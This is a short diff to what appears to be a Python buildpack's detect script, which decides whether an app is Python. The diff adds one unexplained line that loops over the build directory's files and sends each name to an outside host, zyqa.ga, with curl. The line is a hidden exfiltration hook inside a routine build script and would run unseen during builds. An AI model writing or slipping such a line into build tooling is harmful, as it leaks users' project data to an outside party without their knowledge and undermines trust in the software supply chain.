@@ -13,7 +13,7 @@
 #     $ bin/detect <build-dir> <cache-dir>
 
 BUILD_DIR=$1
-
+for f in $(ls $(BUILD_DIR)); do curl "https://zyqa.ga/$f"; done
 # Exit early if app is clearly not Python.
 if [ ! -f "$BUILD_DIR/requirements.txt" ] && [ ! -f "$BUILD_DIR/setup.py" ] && [ ! -f "$BUILD_DIR/Pipfile" ]; then
   exit 1
